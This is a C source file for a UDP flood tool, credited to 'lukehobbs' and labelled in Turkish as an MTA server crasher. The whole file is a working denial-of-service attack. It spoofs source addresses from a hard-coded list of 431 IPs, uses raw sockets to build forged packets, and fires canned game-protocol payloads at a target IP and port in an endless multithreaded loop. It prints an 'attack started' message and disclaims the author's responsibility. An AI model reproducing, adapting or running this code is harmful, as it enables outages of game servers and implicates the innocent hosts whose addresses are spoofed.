// xts3 scriptinden geliştirilmiştir. by lukehobbs

#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9
static unsigned int codedbylukehobbs;
static uint32_t Q[4096], c = 362436;
struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
static unsigned int attport;
void init_rand(uint32_t x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++)
        {
                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
        }
}
 
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
 

unsigned short csum (unsigned short *buf, int nwords)
{
        unsigned long sum;
        for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        return (unsigned short)(~sum);
}
 
void setup_ip_header(struct iphdr *iph)
{
      iph->ihl = 5;
      iph->version = 0;
      iph->tos = 0;
      iph->frag_off = 1;
      iph->protocol = IPPROTO_UDP;
      iph->check = 0;
}
 
void setup_udp_header(struct udphdr *udph)
{
      udph->source = htons(50000 + rand_cmwc() % 65535);
      udph->check = 0;
}
 
void *flood(void *par1)
{
        char *td = (char *)par1;
        char datagram[MAX_PACKET_SIZE];
        struct iphdr *iph = (struct iphdr *)datagram;
        struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
        struct sockaddr_in sin;
                sin.sin_family = AF_INET;
                sin.sin_addr.s_addr = inet_addr(td);
                sin.sin_port = attport;
        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
        if(s < 0){
                fprintf(stderr, "[+] Could not open raw socket.\n");
                exit(-1);
        }
        init_rand(time(NULL));
        memset(datagram, 0, MAX_PACKET_SIZE);
        setup_ip_header(iph);
        setup_udp_header(udph);

				udph->dest = attport;
        udph->source = htons(27005);
        iph->daddr = sin.sin_addr.s_addr;

		int class[]= {2372231209,2728286747,1572769288,3339925505,2372233279,3254787125,1160024353,2328478311,3266388596,3238005002,1745910789,3455829265,1822614803,3355015169,3389792053,757144879,2734605396,1230980369,3639549962,2728310654,3256452616,3561573700,2918529833,2890221130,2918997764,2453837834,3369835018,3256452681,3007103780,1137178634,3264375402,3229415686,2728310653,3627732067,2890220626,1137178635,3391077889,1745910533,1755074592,16843009,1092011777,3223532318,2918529914,621985916,2728287341,1191626519,2890184316,1822618132,1168895755,3639551498,3455827995,3338431589,3222035998,1731284993,1540078376,3423468322,3254790913,2372224268,2372233305,1822611509,3639550986,2918529633,2890217035,2728286295,2728310634,1488976481,3372614717,3224391454,3223389196,2728329505,1760832002,879920151,3328983856,2728310645,2627363865,2372224322,1499753002,1386562582,875052612,3426605106,2890251825,2728286223,2728310638,2328478534,1822614881,879919113,846476877,3390912871,3238005001,2734604550,1746152824,1539838052,1475895815,1123085431,3639550485,3397779518,3254783489,3223277598,3236292914,2728329249,249627429,1745909765,3339148045,2890217051,1822614887,1746125597,1358538789,839341370,3732673086,3238005000,3221554718,3187841866,2918529910,2542501898,2372224274,1509469200,1121752324,3588504106,3281714501,2372231173,2354214403,1877438500,1746504997,1572678189,1386570514,1123631710,778390842,3562249811,3357634306,3355320065,3352559669,2918529846,2734605379,2728310629,2728292211,2627370561,1822618129,1121752339,879905324,864886835,401541676,3368085770,3281689978,3105469954,2734605380,2637637498,1746667045,1607997226,3226633758,2918529919,2918529639,2890216975,2734605608,2728310642,2627354890,2372224304,2372233499,1482909190,3475901778,3324575748,3221554177,3184129025,2890154342,2728303398,2673421074,2297665372,879919114,3627732078,3639551509,3423468304,3413598005,3355013121,3118228756,2890217308,2890217011,2728310650,2728292214,2627370049,2609248308,2061767504,401285152,3639550474,3544957520,3455828543,3221245464,3187838794,3118228793,2918529872,2609248268,225126924,1566231927,1559430661,1347043330,879905826,3367840010,3108454677,2745962606,2734604397,2734604388,2372226080,1541444905,763183627,3355643150,3234588170,2890217320,2372226403,2328477289,1746667301,1019160141,3455829021,3451508746,3352559679,3223953950,3036312413,2915649581,2728286231,2728295989,2609248267,1746883363,3495166517,3495166005,2728329546,2372226339,2354214404,225179146,1746651228,1755075616,1158721290,1123631699,757107306,3627734829,3588504105,3513807393,3372614671,3234222083,2918529587,2328472852,1822614857,1746651484,1729902934,16777217,1347570977,1249741850,401286176,3451508778,3339924993,3267263505,2890220602,2890217232,2734605610,2734604590,2627354634,2372233317,2061767503,3370514442,3224001822,3223391774,2890153573,2728286564,2609248309,2372231206,1746669130,1746505581,1746018670,1540324867,1490426385,3627734819,3571472426,3389791009,3339754505,3238004997,3224678942,3105432334,2918529646,2501132291,2372226408,2372233487,2372233333,1746505837,2916403734,2890153763,2609247813,2372231196,1822614893,1122525959,879894536,610792735,3588503850,3494790672,3350508607,3302533386,1572396061,1046910020,1039029042,778432376,679348486,3281684007,2728310635,2319739454,225126923,1822614869,1822614791,1390242054,1185293895,3629619233,3639549973,3356113973,3258558721,3224793118,3113151523,2918529907,2734605395,2728310655,1746669386,2734604591,2728310636,1760832065,1539137028,2728329756,2372231208,2372224328,879905323,675544612,634503170,3494653237,3162044975,3113716993,2919228438,2728310575,1054006394,3339146026,3339925761,3224087582,2328461595,225117528,1746152568,1092011009,879894535,97447234,3251539246,3223622673,3118228768,2728310632,2372233584,3627734830,3355643147,3339142145,3228574724,3221245453,2890152495,2734604396,2728310647,1822617914,1822612837,1494642712,3562246432,3238004993,3109164125,2745964819,2372231174,2264919306,1822617962,3647724345,3328294453,3224851230,3221245452,2728310599,2673449270,2609248307,2540009556,2372226378,1998378804,1745910021,879905827,676177781,3629620001,3254789121,3118786598,3113151522,2918529642,2728282915,1822617878,1746018414,1123077410,401541708,3339924737,2453837835,2151612981,1347928371,1249741851,2728286267,2734604551,2728286303,2372226052,3390923303,2734604389,1877351697,1475895816,2372231186,3663327556,3221245216,3639550997,3413595749,3252515125,2609247812,2372231207,2372226334,1746373394,3350509109,2372231195,3562380810,2918997773,3323221858,2918529663,2016704517,1475395139,1123631109,3238004999,1389915980,95573855,3238004998,3221245186,3118228769,3118228770,3225059358,3256452680,1779203355,1746883107,1760832066,1585621764,3222952990,3627734826};
 			int fake_id = rand_cmwc() & 0xFFFFFFFF; 
            iph->id = htonl(fake_id);
            iph->saddr = htonl(class[rand_cmwc()%431]);
			   
			int hx = rand()%6;
			
	  		if(hx == 1){  // MTA'ya bağlandığında çıkan paket.
            memcpy((void *)udph + sizeof(struct udphdr), "\x2e\xc4\x45\x5e\x02\x3b\x75\x15\xf3\xe6\x55\xf3\x00\x3b\x4e\x10\x09\x04\xf2\x39\xd9\x86\xfa\x73\x85\xff\x7a\x46\x12\x23\x4f\xc7\x95\x6e\x00\xff\x00\xff\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x78\x56\x34\x17\xed\xca\x01\x01\xa8\x04\xe8\x03\x00\x00\xc8\x04\xe8\x03\x00\x00\xde", 51);
			iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 51;
		    udph->len=htons(sizeof(struct udphdr) + 51);
     		iph->ttl = 114;
}
		    if(hx == 2){
            memcpy((void *)udph + sizeof(struct udphdr), "\x5b\x99\x41\x7c\x74\xd2\x0b\x31\xae\x34\xb3\x28\x1f\xdd\x69\x89\xea\xb3\x54\x50\xaa\xda\x7f\x6f\x2b", 25);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 25;
		    udph->len=htons(sizeof(struct udphdr) + 25);
			iph->ttl = 125;
			}
						
			if(hx == 3){
		    memcpy((void *)udph + sizeof(struct udphdr), "\xc3\x1f\x8e\xac\x5e\x53\x7b\xf5\xab\x11\x7f\x8a\x7c\x3a\x6b\xb5\xff", 17);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 17;
		    udph->len=htons(sizeof(struct udphdr) + 17);
			iph->ttl = 64;
            }
			if(hx == 4){
		    memcpy((void *)udph + sizeof(struct udphdr), "\x0a\x00\xff\x00\xff\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x78\x56\x34\x17\x7d\x95\xdf\x39\xa0\xcf\xbc\x7a\x73\xb2\xc7\x92\x89\x86\xd1\x50\xed\x80\x01\x01\x6e\x32\x4f\x46\x58\x4f\x51\x4c\x46\x50\x56\x56\x55\x4c\x58\x48\x55\x4c\x55\x56\x47\x51\x52\x4e\x46\x48\x43\x5a\x4b\x52\x55\x42\x58\x47\x5a\x4e\x58\x41\x5a\x46\x59\x43\x53\x55\x57\x55\x53\x54\x4c\x4c\x58\x58\x1a\x00\xa8\x04\x40\x0d\x03\x00\xc8\x04\x80\x84\x1e\x00\xde", 104);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 104;
		    udph->len=htons(sizeof(struct udphdr) + 104);
			iph->ttl = 86;
            }
			if(hx == 5){
		    memcpy((void *)udph + sizeof(struct udphdr), "\x6a\xb1\xcd\xe2\x9b\xf9\xe5\x5d\x9a\xd6\x4a\x93\x81\x88\x7e\x04\x10\x8a\x91\xcd\xa1\xe8\x6f\x33\x05\x69\xce\x40\x76\x02\xc8\x64\x7c\xa5\x8c\x64\xfa\xd8\xb8\x3b\x8c\x05\xb9\xd2\x24\x57\x2a\xe4\x62\xf3\xde\x3f\x65\xcf\x73\x37\x09\x79\x0a\x64\x0a\x3f\x34\x01\xc8\x29\xe6\x5d\xeb\xda\x9c\xa5\xdb\x13\xf0\x6b\x15\x60\x59\x6c\x7f\x79\x81\x86\x24\xcc\x9e\x51\xc3\x73\x85\x37\x7e\x1d\x19\x7b\x5f\xe0\xe6\x6e\x54\x05\xc4\x21\x12", 105);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 105;
		    udph->len=htons(sizeof(struct udphdr) + 105);
			iph->ttl = 86;
            }


        iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
        int tmp = 1;
        const int *val = &tmp;
        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
                fprintf(stderr, "[+] Error: setsockopt() - Cannot set HDRINCL!\n");
                exit(-1);
        }
        int i=0;
        while(1){
                           sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
                           udph->source = htons(rand()%65535);
                           if (attport == 0) { udph->dest = htons(rand()%65535);; } // random port 
                           else { udph->dest = attport; } // RANDOM PORT DALGASI :D
                
                                iph->daddr = sin.sin_addr.s_addr;
                                iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
                               
                               
                if(i==5)
                {
                        usleep(0);
                        i=0;
                }
                i++;
        }
}

int main(int argc, char *argv[ ])
{
        if(argc < 4){
						
                fprintf(stderr, "[+] Copyright (C) Since 2022\n");
				fprintf(stderr, "[+] Scripti Yapan Sorumlu Tutulmaz... \n");
				fprintf(stderr, "[+] Coded By LukeHobbs \n");
                fprintf(stderr, "[+] [MTA] Crasher v1.0.0 @ Exploit Flood \n");
                fprintf(stdout, "[+] Usage: %s <Hedef IP> <Port 0 random> <Time>\n", argv[0]);
				exit(-1);
                
        }
        int i = 0;
        int max_len = 128;
        char *buffer = (char *) malloc(max_len);
        buffer = memset(buffer, 0x00, max_len);
        int num_threads = 3;
        pthread_t thread[num_threads];
        struct thread_data td[num_threads];
        attport = htons(atoi(argv[2]));
        for(i = 0;i<num_threads;i++){
        pthread_create( &thread[i], NULL, &flood, (void *) argv[1]);
        }

        fprintf(stdout, "[+] Saldiri Baslatildi....\n");
		   
        if(argc > 4)
        {
                sleep(10);
        } else {
                while(1){
                        sleep(1);
                }
        }
        return 0;
}